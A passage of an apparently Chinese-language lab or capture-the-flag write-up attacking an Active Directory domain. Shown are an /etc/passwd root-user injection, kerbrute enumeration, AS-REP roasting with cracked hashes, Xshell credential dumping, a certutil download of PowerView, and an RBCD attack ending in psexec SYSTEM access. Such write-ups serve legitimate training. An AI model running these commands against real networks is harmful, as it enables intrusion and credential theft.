pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
ntp:x:113:118::/nonexistent:/usr/sbin/nologin
_chrony:x:114:124:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
fwupd-refresh:x:115:125:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:116:127:MySQL Server,,,:/nonexistent:/bin/false
test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash
www-data@web01:/tmp$ <span class="token function">cat</span> a.txt <span class="token operator">|</span> openssl enc <span class="token parameter variable">-out</span> <span class="token string">"/etc/passwd"</span>
www-data@web01:/tmp$ <span class="token function">su</span> <span class="token builtin class-name">test</span>
Password: 
root@web01:/tmp<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~/flag<span class="token comment"># cat flag01.txt </span>
                                 _         _       _   _                 
  ___ ___  _ __   __ _ _ __ __ _<span class="token operator">|</span> <span class="token operator">|</span>_ _   _<span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___  _ __  ___ 
 / __/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ \ / _` | '</span>__/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>/ _ <span class="token punctuation">\</span><span class="token operator">|</span> '_ <span class="token punctuation">\</span>/ __<span class="token operator">|</span>
<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">\</span>__ <span class="token punctuation">\</span>
 <span class="token punctuation">\</span>___<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>___/
                 <span class="token operator">|</span>___/                                                   

flag01: flag<span class="token punctuation">&#123;</span>bcda81ca-1b43-4c1c-aa9a-e4860bbf377e<span class="token punctuation">&#125;</span></code></pre>

<h2 id="AS-REP-Rroasting"><a href="#AS-REP-Rroasting" class="headerlink" title="AS-REP Rroasting"></a>AS-REP Rroasting</h2><p>扫一下内网</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.60.8: <span class="token punctuation">[</span><span class="token number">88</span> <span class="token number">135</span> <span class="token number">139</span> <span class="token number">445</span><span class="token punctuation">]</span>  DC
<span class="token number">172.22</span>.60.15: <span class="token punctuation">[</span><span class="token number">135</span> <span class="token number">139</span> <span class="token number">445</span><span class="token punctuation">]</span> PC1
<span class="token number">172.22</span>.60.52: <span class="token punctuation">[</span><span class="token number">22</span> <span class="token number">80</span><span class="token punctuation">]</span>    外网
<span class="token number">172.22</span>.60.42: <span class="token punctuation">[</span><span class="token number">135</span> <span class="token number">139</span> <span class="token number">445</span><span class="token punctuation">]</span> Fileserver</code></pre>
<p>后面就是一个完整的AD域了，先利用前面的获取到的用户名枚举一下域内用户<br>kerbrute枚举</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:/tmp<span class="token comment"># ./kerbrute_linux_amd64  userenum --dc  172.22.60.8 -d xiaorang.lab  user.txt</span>

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
 / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        

Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 02/03/25 - Ronnie Flathers @ropnop

<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>   <span class="token number">172.22</span>.60.8:88

<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       chenfang@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       administrator@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       wangkai@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       wangping@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       yangyan@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       wangyun@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       zhanghao@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       zhangwei@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       zhangxin@xiaorang.lab
<span class="token number">2025</span>/02/03 <span class="token number">12</span>:25:43 <span class="token operator">></span>  Done<span class="token operator">!</span> Tested <span class="token number">246</span> usernames <span class="token punctuation">(</span><span class="token number">9</span> valid<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">0.033</span> seconds</code></pre>
<p>尝试AS-REP Rroasting,为了方便做个socks然后在kali上操作</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4  GetNPUsers.py <span class="token parameter variable">-usersfile</span> validuser.txt -no-pass -dc-ip  <span class="token number">172.22</span>.60.8 xiaorang.lab/      <span class="token punctuation">[</span><span class="token number">12</span>:33:59<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User chenfang@xiaorang.lab doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[proxychains] Strict chain  ...  101.43.121.110:7002  ...  172.22.60.8:88  ...  OK
[-] User administrator@xiaorang.lab doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User wangkai@xiaorang.lab doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[proxychains] Strict chain  ...  101.43.121.110:7002  ...  172.22.60.8:88  ...  OK
[-] User wangping@xiaorang.lab doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User yangyan@xiaorang.lab doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[proxychains] Strict chain  ...  101.43.121.110:7002  ...  172.22.60.8:88  ...  OK
$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:95859391e595665fa42a1f0dc63302fa$a132355a8b2b205dc34c424fa338c1bea144a5b6ec5b431b5313cb295927bbc139daff462d5fe3522024ff1696f7531c876942678f18d642bcec5e80d5cc702a08dd85f09f7578a4928bbe9c20e3c5f25c749fec01578caaa3a44794ccfdd303b91f700d18df39af4afdaa1027dfbc24e3163caaeb231790f48807f1acd9dcd184ff9d496ea7da48d6cec56400c2c9dc23575a01ce54af0ac4b1b04c101cc449ad4ce6f28c3bdae1dfc49ca0b065c73b62159799603c6a81d09d3cc73eee4237695a926a3f53158c617d72ee6b1b6d4512254e048c88532022a2a1c8e18f47c83c296840941b01186c2f7d7b
[proxychains] Strict chain  ...  101.43.121.110:7002  ...  172.22.60.8:88  ...  OK
[-] User zhanghao@xiaorang.lab doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User zhangwei@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$zhangxin</span>@xiaorang.lab@XIAORANG.LAB:13d7f8d314577aa997f8ce23ba6d1b5c<span class="token variable">$5923288bb5a5e8be1155db8ce2cff9c932dcbe6b3fef567ff34191f814b6418dca2f66257ce4b74709c7ba9a5e1146b487d760b7cea6e39f8f29c1f55e2b910adb01042d31ad13c79126b4ad8db5579617119caf625b9131559b1998c199f8e7340f4628c17908ac869c8ef24e974c481ebc0ef03320185f017ba5030d5aa6a3fa8ca61f15d42373934d0be0ea9b1857dce8d382cde7e2e94413156ae60e6a2b0a6f829f75ba11bc6d5fe4da7ae1a13b260673cd4a182bc960dff3e67096d4e60c8805b741d0c32b68be6ad9d822d22090d21a94a42a775f4e3808f4bca3ab22a039de76837c34ccc2523d55</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt                                                 <span class="token punctuation">[</span><span class="token number">12</span>:35:08<span class="token punctuation">]</span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>krb5asrep, Kerberos <span class="token number">5</span> AS-REP etype <span class="token number">17</span>/18/23 <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Adm12geC         <span class="token punctuation">(</span><span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$wangyun</span>@xiaorang.lab@XIAORANG.LAB<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:07 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-03 <span class="token number">12</span>:35<span class="token punctuation">)</span> <span class="token number">0</span>.1394g/s 301784p/s 301784c/s 301784C/s Adr1enne<span class="token punctuation">..</span>Adinda1
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed.</code></pre>
<p>爆破出wangyun密码<code>Adm12geC</code>,RDP连接<br><img src="https://i.111666.best/image/Jx0TuvriDZd3p72SvFLAPE.png" alt="image" loading="lazy"><br>桌面有个xshell想到xshell取证，抓一下密码<br><a target="_blank" rel="noopener" href="https://github.com/JDArmy/SharpXDecrypt/releases/tag/v0.1.4">https://github.com/JDArmy/SharpXDecrypt/releases/tag/v0.1.4</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>wangyun<span class="token punctuation">\</span>Desktop<span class="token operator">></span>SharpXDecrypt.exe

Xshell全版本凭证一键导出工具<span class="token operator">!</span><span class="token punctuation">(</span>支持Xshell <span class="token number">7.0</span>+版本<span class="token punctuation">)</span>
Author: 0pen1
Github: https://github.com/JDArmy
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> WARNING: For learning purposes only,please delete it within <span class="token number">24</span> hours after downloading<span class="token operator">!</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Start GetUserPath<span class="token punctuation">..</span><span class="token punctuation">..</span>
  UserPath: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>wangyun<span class="token punctuation">\</span>Documents<span class="token punctuation">\</span>NetSarang Computer<span class="token punctuation">\</span><span class="token number">7</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Get UserPath Success <span class="token operator">!</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Start GetUserSID<span class="token punctuation">..</span><span class="token punctuation">..</span>
  Username: wangyun
  userSID: S-1-5-21-3535393121-624993632-895678587-1107
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> GetUserSID Success <span class="token operator">!</span>

  XSHPath: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>wangyun<span class="token punctuation">\</span>Documents<span class="token punctuation">\</span>NetSarang Computer<span class="token punctuation">\</span><span class="token number">7</span><span class="token punctuation">\</span>Xshell<span class="token punctuation">\</span>Sessions<span class="token punctuation">\</span>SSH.xsh
  Host: <span class="token number">172.22</span>.60.45
  UserName: zhangxin
  Password: admin4qwY38cc
  Version: <span class="token number">7.1</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token builtin class-name">read</span> done<span class="token operator">!</span></code></pre>
<p>拿到zhangxin的密码<code>admin4qwY38cc</code></p>
<h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><p>为了方便分析域内关系，用SharpHound分析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">powershell <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-command</span> <span class="token string">"Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"</span></code></pre>
<p><img src="https://i.111666.best/image/KA8DfIeXRYvjF1QocAFvgy.png" alt="image" loading="lazy"></p>
<p>zhangxin是<code>account operators</code>组成员，可以创建不是域管的账户和组<br><img src="https://i.111666.best/image/Ve1xQ2thejXQO17GH801at.png" alt="image" loading="lazy"><br>那么就可以获取到FILESERVER这台主机，其实打的是RBCDM,跟着步骤走</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> Set-ExecutionPolicy Bypass <span class="token parameter variable">-Scope</span> Process
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>Powermad.ps1
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> New-MachineAccount <span class="token parameter variable">-MachineAccount</span> test1 <span class="token parameter variable">-Password</span> <span class="token variable"><span class="token variable">$(</span>ConvertTo-SecureString <span class="token string">"123456"</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span><span class="token variable">)</span></span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Machine account mycomputer added
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://172.22.60.52:6677/powerview.ps1。
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>powerview.ps1
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> Get-NetComputer test1 <span class="token parameter variable">-Properties</span> objectsid
objectsid
---------
S-1-5-21-3535393121-624993632-895678587-1117</code></pre>
<p>然后修改FILESERVER的<code>msds-allowedtoactonbehalfofotheridentity</code>值</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token variable">$SD</span> <span class="token operator">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="token parameter variable">-ArgumentList</span> <span class="token string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1117)"</span>
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token variable">$SDBytes</span> <span class="token operator">=</span> New-Object byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token variable">$SD</span>.BinaryLength<span class="token punctuation">)</span>
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token variable">$SD</span>.GetBinaryForm<span class="token punctuation">(</span><span class="token variable">$SDBytes</span>, <span class="token number">0</span><span class="token punctuation">)</span>
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangxin<span class="token punctuation">\</span>Desktop<span class="token operator">></span> Get-DomainComputer FILESERVER <span class="token operator">|</span> Set-DomainObject <span class="token parameter variable">-Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msds-allowedtoactonbehalfofotheridentity'</span><span class="token operator">=</span><span class="token variable">$SDBytes</span><span class="token punctuation">&#125;</span> <span class="token parameter variable">-Verbose</span>
详细信息: Get-DomainSearcher search string: LDAP://DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
详细信息: <span class="token punctuation">[</span>Get-DomainObject<span class="token punctuation">]</span> Extracted domain <span class="token string">'xiaorang.lab'</span> from <span class="token string">'CN=FILESERVER,CN=Computers,DC=xiaorang,DC=lab'</span>
详细信息: Get-DomainSearcher search string: LDAP://DC.xiaorang.lab/DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
详细信息: <span class="token punctuation">[</span>Get-DomainObject<span class="token punctuation">]</span> Get-DomainObject filter string:
<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">|</span><span class="token punctuation">(</span>distinguishedname<span class="token operator">=</span>CN<span class="token operator">=</span>FILESERVER,CN<span class="token operator">=</span>Computers,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab<span class="token punctuation">))</span><span class="token punctuation">)</span>
详细信息: <span class="token punctuation">[</span>Set-DomainObject<span class="token punctuation">]</span> Setting <span class="token string">'msds-allowedtoactonbehalfofotheridentity'</span> to <span class="token string">'1 0 4 128 20 0 0 0 0 0 0 0 0 0 0
0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209 185
 210 96 165 64 37 123 248 98 53 92 4 0 0'</span> <span class="token keyword">for</span> object <span class="token string">'FILESERVER$'</span></code></pre>
<p>然后请求ST连接smb</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains  getST.py -dc-ip <span class="token number">172.22</span>.60.8 xiaorang.lab/test1<span class="token punctuation">\</span>$:123456 <span class="token parameter variable">-spn</span> cifs/Fileserver.xiaorang.lab <span class="token parameter variable">-impersonate</span> administrator  <span class="token punctuation">[</span><span class="token number">15</span>:10:46<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting TGT <span class="token keyword">for</span> user
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Impersonating administrator
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Requesting S4U2self
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Requesting S4U2Proxy
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:88  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saving ticket <span class="token keyword">in</span> administrator.ccache
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache                                                                                             <span class="token punctuation">[</span><span class="token number">15</span>:10:48<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains psexec.py Administrator@FILESERVER.xiaorang.lab <span class="token parameter variable">-k</span> -no-pass -dc-ip <span class="token number">172.22</span>.60.8                                         <span class="token punctuation">[</span><span class="token number">15</span>:11:00<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.42:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting shares on FILESERVER.xiaorang.lab<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found writable share ADMIN$
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading <span class="token function">file</span> tgwYiXso.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening SVCManager on FILESERVER.xiaorang.lab<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token function">service</span> uoRW on FILESERVER.xiaorang.lab<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> uoRW<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.42:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.42:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.42:445  <span class="token punctuation">..</span>.  OK



C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>whoami
nt authority<span class="token punctuation">\</span>system</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">``<span class="token variable"><span class="token variable">`</span><span class="token function">bash</span>
C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>flag<span class="token operator">></span>type flag03.txt
 ________  __                                        
<span class="token operator">|</span>_   __  <span class="token operator">|</span><span class="token punctuation">[</span>  <span class="token operator">|</span>                                       
